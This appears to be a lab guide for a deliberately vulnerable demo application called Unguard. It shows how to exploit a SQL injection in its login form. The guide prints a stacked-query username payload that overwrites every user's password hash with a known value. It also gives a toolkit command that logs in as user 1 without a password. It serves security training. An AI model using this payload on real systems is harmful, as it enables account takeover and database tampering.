# SQL Injection

Utilizing [SQL injection](https://owasp.org/www-community/attacks/SQL_Injection) can lead to sensitive data being read
and/or databases to be modified (Insert/Update/Delete).
In addition, administrative operations such as shutting down the DBMS can also be completed.

Unguard provides the functionality to log in with a username and password.
As the username is not correctly sanitized before being inserted into an SQL statement, it is possible to insert SQL commands
that will then be run.
The database configuration is set to allow multiple statements to be executed for one query command divided by semicolon.


## Preconditions and Requirements

For this exploit to work you need:

* [unguard](../../../docs/DEV-GUIDE.md) deployed and running
* (optional) [unguard-exploit-toolkit](../../INSTALL.md) set up

## Exploitation

To inject an SQL command, you simply need to open the login page of Unguard. For username insert
SQL statements which need to be properly prepared (see the next chapter "w/o Toolkit CLI").

### w/o Toolkit CLI

SQL injections are possible via the frontend. As mentioned before, you can use the username and password on the login page
to execute SQl code.

An example for an SQL statement to run:

```sql
UPDATE users
SET password_hash='$2b$10$oYZ0GWhlnYQXgqtf2N24oeXE6JZ4WMNPt8yKCfaLpJAOqaKKyrjda'
WHERE 1 = 1;
```

This will set every user's password to 'password'.

To have this executed on the database, you need to modify put the following text to the username:
```
"; UPDATE users SET password_hash="$2b$10$oYZ0GWhlnYQXgqtf2N24oeXE6JZ4WMNPt8yKCfaLpJAOqaKKyrjda" WHERE 1 = 1; #
```


### With Toolkit CLI

Using the `ug-exploit` tool, SQL statements can be injected.
Use `ug-exploit sql-inject-login` to log in as the user with the ID 1 without knowing the password using SQL injection.

You can additionally define a SQL statement to be injected before the login. In this example, your input would just need to be:

```sql
UPDATE users
SET password_hash='$2b$10$oYZ0GWhlnYQXgqtf2N24oeXE6JZ4WMNPt8yKCfaLpJAOqaKKyrjda'
WHERE 1 = 1;
```

## Further Details

* [SQL Injection - OWASP](https://owasp.org/www-community/attacks/SQL_Injection)
